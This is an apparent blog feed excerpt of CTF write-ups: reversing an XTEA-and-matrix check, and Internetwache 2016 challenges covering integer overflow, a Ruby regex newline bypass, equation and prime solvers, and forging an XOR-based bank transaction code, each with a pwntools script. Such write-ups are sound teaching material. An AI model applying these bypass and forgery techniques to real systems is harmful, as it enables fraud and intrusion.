+<figure class="highlight python"><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br></pre></td><td class="code"><pre><span class="hljs-keyword">exec</span> <span class="hljs-string">"""<br>import struct<br>e=range<br>I=len<br>import sys<br>F=sys.exit<br><br>X=[[%d,%d,%d],[%d,%d,%d],[%d,%d,%d]]<br>Y = [[383212,38297,8201833],[382494 ,348234985,3492834886],[3842947 ,984328,38423942839]]<br>n=[5034563854941868,252734795015555591,55088063485350767967,-2770438152229037,142904135684288795,-33469734302639376803,-3633507310795117,195138776204250759,-34639402662163370450]<br>y=[[0,0,0],[0,0,0],[0,0,0]]<br>A=[0,0,0,0,0,0,0,0,0]<br><br>for i in e(I(X)):<br>    for j in e(I(Y[0])):<br>        for k in e(I(Y)):<br>            y[i][j]+=X[i][k]*Y[k][j]<br><br>c=0<br>for r in y:<br>    for x in r:<br>        if x!=n[c]:<br>            print "dang..."<br>            F(47)<br>        c=c+1<br>print ":)"<br>"""</span><br></pre></td></tr></table></figure>
+<p>This Python code multiplies two matrices. We can solve it by inverse matrix or using Z3.</p>
+<p>Combining the reversing process of Part2 and Part3, we can use following Python script to get the flag. </p>
+<figure class="highlight python"><figcaption><span>solve.py</span><a href="/2016/03/10/unholy/solve.py">download</a></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br>45<br>46<br></pre></td><td class="code"><pre><span class="hljs-keyword">from</span> numpy <span class="hljs-keyword">import</span> array, dot, float64<br><span class="hljs-keyword">from</span> numpy.linalg <span class="hljs-keyword">import</span> inv<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># reverse Part3: matrix multiplication</span><br>Y = array([[<span class="hljs-number">383212</span>, <span class="hljs-number">38297</span>, <span class="hljs-number">8201833</span>],<br>           [<span class="hljs-number">382494</span>, <span class="hljs-number">348234985</span>, <span class="hljs-number">3492834886</span>],<br>           [<span class="hljs-number">3842947</span>, <span class="hljs-number">984328</span>, <span class="hljs-number">38423942839</span>]], float64)<br>n = array([[<span class="hljs-number">5034563854941868</span>,<span class="hljs-number">252734795015555591</span>,<span class="hljs-number">55088063485350767967</span>],<br>           [<span class="hljs-number">-2770438152229037</span>,<span class="hljs-number">142904135684288795</span>,<span class="hljs-number">-33469734302639376803</span>],<br>           [<span class="hljs-number">-3633507310795117</span>,<span class="hljs-number">195138776204250759</span>,<span class="hljs-number">-34639402662163370450</span>]], float64)<br><br><span class="hljs-comment">#matrix = [-1304886577, 722035088, 1368334760,</span><br><span class="hljs-comment">#           1473172750, 412774077, -908901225,</span><br><span class="hljs-comment">#           -490967005, 563111828, -952589187, 1306786301]</span><br>matrix = dot(n, inv(Y)).round().astype(int).flatten().tolist() + [<span class="hljs-number">1306786301</span>]<br><br><span class="hljs-comment"># reverse Part2</span><br>key = [<span class="hljs-number">1952540791</span>, <span class="hljs-number">1768908659</span>, <span class="hljs-number">1852794734</span>, <span class="hljs-number">1701995880</span>]<br>v8 = <span class="hljs-number">0</span>;<br>ary11 = []<br>ary12 = []<br><br><span class="hljs-comment"># compute the needed constant</span><br><span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:<br>    v11 = v8 + key[v8 &amp; <span class="hljs-number">3</span>];<br>    ary11.append(v11)<br>    v8 = (v8 - <span class="hljs-number">1640531527</span>)&amp;<span class="hljs-number">0xffffffff</span>;<br>    v12 = v8 + key[(v8 &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]<br>    ary12.append(v12)<br><br>    <span class="hljs-keyword">if</span> v8 == <span class="hljs-number">-957401312</span>&amp;<span class="hljs-number">0xffffffff</span>:<br>        <span class="hljs-keyword">break</span><br><br>flag = <span class="hljs-string">''</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(matrix), <span class="hljs-number">2</span>):<br>    v9 = matrix[i]&amp;<span class="hljs-number">0xffffffff</span><br>    v10 = matrix[i+<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xffffffff</span><br><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> reversed(range(<span class="hljs-number">32</span>)):<br>        v10 = (v10 - (ary12[j] ^ ((<span class="hljs-number">16</span>*v9 ^ (v9 &gt;&gt; <span class="hljs-number">5</span>)) + v9)))&amp;<span class="hljs-number">0xffffffff</span><br>        v9 = (v9 - (ary11[j] ^ ((<span class="hljs-number">16</span>*v10 ^ (v10 &gt;&gt; <span class="hljs-number">5</span>)) + v10)))&amp;<span class="hljs-number">0xffffffff</span><br><br>    flag += p32(v9) + p32(v10)<br><br><span class="hljs-keyword">print</span> flag[:<span class="hljs-number">-4</span>]<br></pre></td></tr></table></figure>
+<p><code>&amp;0xffffffff</code> which scatters in the script is to simulate integer overflow.</p>
+<blockquote>
+<p>Flag: <code>BKPCTF{hmmm _why did i even do this}</code></p>
+</blockquote>
+<h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h2><ol>
+<li>It seems that Python doesn’t provide a handy way to compute integer with overflow.</li>
+<li>I try to solve Part2 by Z3 at the beginning, but it hang forever. Sometimes we should just settle down to read the code and get our hands dirty. Don’t depend on tools too much.</li>
+<li>I debug by <code>gdb --args ruby main.rb</code>, but it is hard to set breakpoints in a shared library. Maybe there is a better way to debug.</li>
+<li>According to other people’s writeup, the Part2 is actually doing XTEA cipher. The clue is lots of xor and shift operations which implie it is performing some kind of cipher. By googling the constant <code>0xc6ef3720</code>, we can find out that the answer is XTEA.</li>
+</ol>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;python or ruby? why n
+    
+    </summary>
+    
+      <category term="writeup" scheme="http://poning.me/categories/writeup/"/>
+    
+    
+      <category term="reversing" scheme="http://poning.me/tags/reversing/"/>
+    
+      <category term="x86-64" scheme="http://poning.me/tags/x86-64/"/>
+    
+      <category term="python" scheme="http://poning.me/tags/python/"/>
+    
+      <category term="ruby" scheme="http://poning.me/tags/ruby/"/>
+    
+      <category term="Boston Key Party CTF" scheme="http://poning.me/tags/Boston-Key-Party-CTF/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Internetwache CTF 2016: EquationSolver (exp 60)</title>
+    <link href="http://poning.me/2016/03/04/equationsolver/"/>
+    <id>http://poning.me/2016/03/04/equationsolver/</id>
+    <published>2016-03-04T07:58:39.000Z</published>
+    <updated>2016-08-04T02:56:07.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
+<p>I created a program for an unsolveable equation system. My friend somehow forced it to solve the equations. Can you tell me how he did it?</p>
+</blockquote>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>This challenge asks us to solve the following equations.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre>Solve the following equations:<br>X &gt; 1337<br>X * 7 + 4 = 1337<br></pre></td></tr></table></figure>
+<p>Obviously, the solution exists only if the integer overflow exists. I use Z3 to solve this problem.</p>
+<figure class="highlight python"><figcaption><span>solve.py</span><a href="/2016/03/04/equationsolver/solve.py">download</a></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br></pre></td><td class="code"><pre><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> Solver, BitVec<br><br>s = Solver()<br>x = BitVec(<span class="hljs-string">'x'</span>, <span class="hljs-number">32</span>)<br><br>s.add(x &gt; <span class="hljs-number">1337</span>)<br>s.add(x*<span class="hljs-number">7</span> + <span class="hljs-number">4</span> == <span class="hljs-number">1337</span>)<br><br>s.check()<br><span class="hljs-keyword">print</span> s.model()<br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre>$ python solve.py<br>[x = 613566947]<br></pre></td></tr></table></figure>
+<blockquote>
+<p>Flag: <code>IW{Y4Y_0verfl0w}</code></p>
+</blockquote>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;I created a program f
+    
+    </summary>
+    
+      <category term="writeup" scheme="http://poning.me/categories/writeup/"/>
+    
+    
+      <category term="pwn" scheme="http://poning.me/tags/pwn/"/>
+    
+      <category term="Internetwache CTF" scheme="http://poning.me/tags/Internetwache-CTF/"/>
+    
+      <category term="integer overflow" scheme="http://poning.me/tags/integer-overflow/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Internetwache CTF 2016: Ruby&#39;s count (exp 50)</title>
+    <link href="http://poning.me/2016/03/04/rubys-count/"/>
+    <id>http://poning.me/2016/03/04/rubys-count/</id>
+    <published>2016-03-04T02:22:26.000Z</published>
+    <updated>2016-08-04T02:56:07.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
+<p>Hi, my name is Ruby. I like converting characters into ascii values and then calculating the sum.</p>
+</blockquote>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight plain"><table><tr><td class="code"><pre>Let me count the ascii values of 10 characters:<br>abcdefghij<br>WRONG!!!! Only 10 characters matching /^[a-f]&#123;10&#125;$/ !<br></pre></td></tr></table></figure>
+<p>So, now we know the matching regular expression. However, we can’t achieve the target score by input only 10 [a-f] characters.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre>Let me count the ascii values of 10 characters:<br>ffffffffff<br>Sum is: 1020<br>That&apos;s not enough (1020 &lt; 1020)<br></pre></td></tr></table></figure>
+<p>To input more characters, I make use of the feature of Ruby’s regular expression describe in <a href="http://homakov.blogspot.tw/2012/05/saferweb-injects-in-various-ruby.html" target="_blank" rel="external">this post</a>.</p>
+<blockquote>
+<p>^ for start-of-string and $ for end-of-string ARE just new lines - \n!</p>
+</blockquote>
+<p>Using following pattern, we can make the sum more than 1020 and get the flag.</p>
+<figure class="highlight python"><figcaption><span>exp.py</span><a href="/2016/03/04/rubys-count/exp.py">download</a></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br></pre></td><td class="code"><pre><span class="hljs-keyword">from</span> pwnlib.tubes.remote <span class="hljs-keyword">import</span> remote<br><br>r = remote(<span class="hljs-string">'188.166.133.53'</span>, <span class="hljs-number">12037</span>)<br>r.send(<span class="hljs-string">'aaaaaaaaaa\naaaaaaaaaa\n'</span>)<br><span class="hljs-keyword">print</span> r.recvall()<br></pre></td></tr></table></figure>
+<blockquote>
+<p>Flag: <code>IW{RUBY_R3G3X_F41L}</code></p>
+</blockquote>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;Hi, my name is Ruby. 
+    
+    </summary>
+    
+      <category term="writeup" scheme="http://poning.me/categories/writeup/"/>
+    
+    
+      <category term="pwn" scheme="http://poning.me/tags/pwn/"/>
+    
+      <category term="Internetwache CTF" scheme="http://poning.me/tags/Internetwache-CTF/"/>
+    
+      <category term="regex" scheme="http://poning.me/tags/regex/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Internetwache CTF 2016: A numbers game II (code 70)</title>
+    <link href="http://poning.me/2016/03/03/a-numbers-game-ii/"/>
+    <id>http://poning.me/2016/03/03/a-numbers-game-ii/</id>
+    <published>2016-03-03T14:23:14.000Z</published>
+    <updated>2016-08-04T02:56:07.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
+<p>Math is used in cryptography, but someone got this wrong. Can you still solve the equations?<br><strong>Hint:</strong> You need to encode your answers.<br><strong>Attachment:</strong> <a href="/2016/03/03/a-numbers-game-ii/code70.zip" title="code70.zip">code70.zip</a></p>
+</blockquote>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>This challenge is different from <a href="/2016/03/03/a-numbers-game/" title="A numbers game (code 50)">A numbers game (code 50)</a> with only an additional encode/decode process. The encode function has been provided.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br></pre></td><td class="code"><pre><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode</span><span class="hljs-params">(self, eq)</span>:</span><br>    out = []<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> eq:<br>        q = bin(self._xor(ord(c),(<span class="hljs-number">2</span>&lt;&lt;<span class="hljs-number">4</span>))).lstrip(<span class="hljs-string">"0b"</span>)<br>        q = <span class="hljs-string">"0"</span> * ((<span class="hljs-number">2</span>&lt;&lt;<span class="hljs-number">2</span>)-len(q)) + q<br>        out.append(q)<br>    b = <span class="hljs-string">''</span>.join(out)<br>    pr = []<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,len(b),<span class="hljs-number">2</span>):<br>        c = chr(int(b[x:x+<span class="hljs-number">2</span>],<span class="hljs-number">2</span>)+<span class="hljs-number">51</span>)<br>        pr.append(c)<br>    s = <span class="hljs-string">'.'</span>.join(pr)<br>    <span class="hljs-keyword">return</span> s<br></pre></td></tr></table></figure>
+<p>The result of the encoded equations look like:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre>Level 1.: 4.4.5.3.3.3.3.3.3.3.5.6.3.3.3.3.3.4.3.4.3.4.4.4.3.3.3.3.3.4.6.4.3.3.3.3.3.4.3.6.3.4.4.3<br></pre></td></tr></table></figure>
+<p>What <code>encode</code> function does is </p>
+<ol>
+<li>Xor every charactors with 32 (e.g. ‘x’ -&gt; 88)</li>
+<li>Convert every charactors to the binary form with padding 0 (e.g. 88 -&gt; ‘01011000’)</li>
+<li>Concatenate the result in 2.</li>
+<li>Convert every two digits into integer and plus 51 (e.g. ‘01011000’ -&gt; [52, 52, 53, 51])</li>
+<li>Convert the numbers above to charactors and concatenate them with ‘.’ (e.g. [52, 52, 53, 51] -&gt; ‘4.4.5.3’)</li>
+</ol>
+<p>To decode, just reverse the process above. With the encode and decode function, we can use the same program shown in <a href="/2016/03/03/a-numbers-game/" title="A numbers game (code 50)">A numbers game (code 50)</a> to solve the program and get the flag.</p>
+<figure class="highlight py"><figcaption><span>solve.py</span><a href="/2016/03/03/a-numbers-game-ii/solve.py">download</a></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br>45<br>46<br>47<br>48<br>49<br></pre></td><td class="code"><pre><span class="hljs-keyword">from</span> pwnlib.tubes.remote <span class="hljs-keyword">import</span> remote<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode</span><span class="hljs-params">(cypher)</span>:</span><br>    b = <span class="hljs-string">''</span><br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> cypher.split(<span class="hljs-string">'.'</span>):<br>        b += bin(ord(c)<span class="hljs-number">-51</span>)[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">2</span>, <span class="hljs-string">'0'</span>)<br><br>    eq = <span class="hljs-string">''</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(b), <span class="hljs-number">8</span>):<br>        eq += chr(int(b[i:i+<span class="hljs-number">8</span>], <span class="hljs-number">2</span>)^<span class="hljs-number">32</span>)<br><br>    <span class="hljs-keyword">return</span> eq<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode</span><span class="hljs-params">(eq)</span>:</span><br>    out = []<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> eq:<br>        q = bin(ord(c)^(<span class="hljs-number">2</span>&lt;&lt;<span class="hljs-number">4</span>)).lstrip(<span class="hljs-string">"0b"</span>)<br>        q = <span class="hljs-string">"0"</span> * ((<span class="hljs-number">2</span>&lt;&lt;<span class="hljs-number">2</span>)-len(q)) + q<br>        out.append(q)<br>    b = <span class="hljs-string">''</span>.join(out)<br>    pr = []<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,len(b),<span class="hljs-number">2</span>):<br>        c = chr(int(b[x:x+<span class="hljs-number">2</span>],<span class="hljs-number">2</span>)+<span class="hljs-number">51</span>)<br>        pr.append(c)<br>    s = <span class="hljs-string">'.'</span>.join(pr)<br>    <span class="hljs-keyword">return</span> s<br><br>r = remote(<span class="hljs-string">'188.166.133.53'</span>, <span class="hljs-number">11071</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:<br>    lines = r.recvlines(<span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">'\n'</span>.join(lines)<br><br>    eq = decode(lines[<span class="hljs-number">1</span>].split()[<span class="hljs-number">2</span>])<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">'equation:'</span>, eq<br>    sp = eq.split()<br><br>    <span class="hljs-keyword">if</span> sp[<span class="hljs-number">1</span>] == <span class="hljs-string">'+'</span>:<br>        x = int(sp[<span class="hljs-number">4</span>]) - int(sp[<span class="hljs-number">2</span>])<br>    <span class="hljs-keyword">elif</span> sp[<span class="hljs-number">1</span>] == <span class="hljs-string">'-'</span>:<br>        x = int(sp[<span class="hljs-number">4</span>]) + int(sp[<span class="hljs-number">2</span>])<br>    <span class="hljs-keyword">elif</span> sp[<span class="hljs-number">1</span>] == <span class="hljs-string">'*'</span>:<br>        x = int(sp[<span class="hljs-number">4</span>]) / int(sp[<span class="hljs-number">2</span>])<br>    <span class="hljs-keyword">elif</span> sp[<span class="hljs-number">1</span>] == <span class="hljs-string">'/'</span>:<br>        x = int(sp[<span class="hljs-number">4</span>]) * int(sp[<span class="hljs-number">2</span>])<br><br>    <span class="hljs-keyword">print</span> <span class="hljs-string">'x = '</span>, x<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">'encode: '</span>, encode(str(x))<br>    r.sendline(encode(str(x)))<br></pre></td></tr></table></figure>
+<blockquote>
+<p>Flag: <code>IW{Crypt0_c0d3}</code></p>
+</blockquote>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;Math is used in crypt
+    
+    </summary>
+    
+      <category term="writeup" scheme="http://poning.me/categories/writeup/"/>
+    
+    
+      <category term="code" scheme="http://poning.me/tags/code/"/>
+    
+      <category term="Internetwache CTF" scheme="http://poning.me/tags/Internetwache-CTF/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Internetwache CTF 2016: It&#39;s Prime Time! (code 60)</title>
+    <link href="http://poning.me/2016/03/03/its-prime-time/"/>
+    <id>http://poning.me/2016/03/03/its-prime-time/</id>
+    <published>2016-03-03T05:35:27.000Z</published>
+    <updated>2016-08-04T02:56:07.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
+<p>We all know that prime numbers are quite important in cryptography. Can you help me to find some?</p>
+</blockquote>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>In this challenge, we have to find the next prime to a given number 100 times to get the flag. The questions are in the following format. </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre>Level 1.: Find the next prime number after 8:<br></pre></td></tr></table></figure>
+<p>There is a <code>nextprime</code> function in SymPy, so we can solve this problem easily.</p>
+<figure class="highlight py"><figcaption><span>solve.py</span><a href="/2016/03/03/its-prime-time/solve.py">download</a></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br></pre></td><td class="code"><pre><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> nextprime<br><span class="hljs-keyword">from</span> pwnlib.tubes.remote <span class="hljs-keyword">import</span> remote<br><br>r = remote(<span class="hljs-string">'188.166.133.53'</span>, <span class="hljs-number">11059</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:<br>    lines = r.recvlines(<span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">'\n'</span>.join(lines)<br>    p = nextprime(lines[<span class="hljs-number">1</span>].split()[<span class="hljs-number">8</span>][:<span class="hljs-number">-1</span>])<br>    <span class="hljs-keyword">print</span> p<br>    r.send(str(p))<br></pre></td></tr></table></figure>
+<blockquote>
+<p>Flag: <code>IW{Pr1m3s_4r3_!mp0rt4nt}</code></p>
+</blockquote>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;We all know that prim
+    
+    </summary>
+    
+      <category term="writeup" scheme="http://poning.me/categories/writeup/"/>
+    
+    
+      <category term="code" scheme="http://poning.me/tags/code/"/>
+    
+      <category term="Internetwache CTF" scheme="http://poning.me/tags/Internetwache-CTF/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Internetwache CTF 2016: A numbers game (code 50)</title>
+    <link href="http://poning.me/2016/03/03/a-numbers-game/"/>
+    <id>http://poning.me/2016/03/03/a-numbers-game/</id>
+    <published>2016-03-03T01:35:14.000Z</published>
+    <updated>2016-08-04T02:56:07.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
+<p>People either love or hate math. Do you love it? Prove it! You just need to solve a bunch of equations without a mistake.</p>
+</blockquote>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>In this challenge, we need to solve 100 equations to get the flag. The equations are in the following form.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre>Level 1.: x * 14 = 238<br><br>Level 2.: x + 35 = 43<br></pre></td></tr></table></figure>
+<p>There is no special technique. Just parse the equations and solve it.</p>
+<figure class="highlight py"><figcaption><span>solve.py</span><a href="/2016/03/03/a-numbers-game/solve.py">download</a></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br></pre></td><td class="code"><pre><span class="hljs-keyword">from</span> pwnlib.tubes.remote <span class="hljs-keyword">import</span> remote<br><br>r = remote(<span class="hljs-string">'188.166.133.53'</span>, <span class="hljs-number">11027</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:<br>    lines = r.recvlines(<span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">'\n'</span>.join(lines)<br>    sp = lines[<span class="hljs-number">1</span>].split()<br><br>    <span class="hljs-comment"># sp[3] is the operator</span><br>    <span class="hljs-comment"># sp[4] is the operand on the left side</span><br>    <span class="hljs-comment"># sp[6] is the operand on the right side</span><br>    <span class="hljs-keyword">if</span> sp[<span class="hljs-number">3</span>] == <span class="hljs-string">'+'</span>:<br>        x = int(sp[<span class="hljs-number">6</span>]) - int(sp[<span class="hljs-number">4</span>])<br>    <span class="hljs-keyword">elif</span> sp[<span class="hljs-number">3</span>] == <span class="hljs-string">'-'</span>:<br>        x = int(sp[<span class="hljs-number">6</span>]) + int(sp[<span class="hljs-number">4</span>])<br>    <span class="hljs-keyword">elif</span> sp[<span class="hljs-number">3</span>] == <span class="hljs-string">'*'</span>:<br>        x = int(sp[<span class="hljs-number">6</span>]) / int(sp[<span class="hljs-number">4</span>])<br>    <span class="hljs-keyword">elif</span> sp[<span class="hljs-number">3</span>] == <span class="hljs-string">'/'</span>:<br>        x = int(sp[<span class="hljs-number">6</span>]) * int(sp[<span class="hljs-number">4</span>])<br><br>    <span class="hljs-keyword">print</span> x<br>    r.sendline(str(x))<br></pre></td></tr></table></figure>
+<blockquote>
+<p>Flag: <code>IW{M4TH_1S_34SY}</code></p>
+</blockquote>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;People either love or
+    
+    </summary>
+    
+      <category term="writeup" scheme="http://poning.me/categories/writeup/"/>
+    
+    
+      <category term="code" scheme="http://poning.me/tags/code/"/>
+    
+      <category term="Internetwache CTF" scheme="http://poning.me/tags/Internetwache-CTF/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Internetwache CTF 2016: Bank (crypto 90)</title>
+    <link href="http://poning.me/2016/03/02/bank/"/>
+    <id>http://poning.me/2016/03/02/bank/</id>
+    <published>2016-03-02T06:59:42.000Z</published>
+    <updated>2016-08-04T02:56:07.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
+<p>Everyone knows that banks are insecure. This one super secure and only allows only 20 transactions per session. I always wanted a million on my account.<br><strong>Attachment:</strong> <a href="/2016/03/02/bank/crypto90.zip" title="crypto90.zip">crypto90.zip</a></p>
+</blockquote>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>In this challenge, we have to deposit 1000000 dollars in the account within 20 transactions to get the flag. To complete a transaction, we have to first initiate it by providing how much we want to deposit. Then, use the “hashcode” it returns to finalize the transaction. The problem is that we can only deposit 5000 dollars at a time, so we must tamper the “hashcode” to deposit more money.</p>
+<p>The vulnerability in this challenge is that the “hashcode” it returns is just the result of xoring the plain text and a key. Since we know what the plain text is, we can easily retrieve the key and use it to create a “hashcode” of our own content. I created 20 transactions of 99999 dollars to get the flag.</p>
+<figure class="highlight python"><figcaption><span>exp.py</span><a href="/2016/03/02/bank/exp.py">download</a></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br></pre></td><td class="code"><pre><span class="hljs-keyword">from</span> pwnlib.tubes.remote <span class="hljs-keyword">import</span> remote<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sxor</span><span class="hljs-params">(s1, s2)</span>:</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">''</span>.join(chr(ord(a)^ord(b)) <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> zip(s1, s2))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">falsify</span><span class="hljs-params">(hashcode)</span>:</span><br>    key = sxor(<span class="hljs-string">'TRANSACTION: 1000'</span>, hashcode.decode(<span class="hljs-string">'hex'</span>))<br>    <span class="hljs-keyword">return</span> sxor(<span class="hljs-string">'TRANSACTION:99999'</span>, key).encode(<span class="hljs-string">'hex'</span>)<br><br><br>r = remote(<span class="hljs-string">'188.166.133.53'</span>, <span class="hljs-number">10061</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">20</span>):<br>    <span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'Command: '</span>)<br>    r.sendline(<span class="hljs-string">'create 1000'</span>)<br><br>    line = r.recvline()<br>    <span class="hljs-keyword">print</span> line<br>    hashcode = line.split()[<span class="hljs-number">-1</span>]<br><br>    <span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'Command: '</span>)<br>    r.sendline(<span class="hljs-string">'complete '</span> + str(i) + <span class="hljs-string">' '</span> + falsify(hashcode))<br><br><span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'Command: '</span>)<br></pre></td></tr></table></figure>
+<blockquote>
+<p>Flag: <code>IW{SHUT_UP_AND_T4K3_MY_M000NEYY}</code></p>
+</blockquote>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;Everyone knows that b
+    
+    </summary>
+    
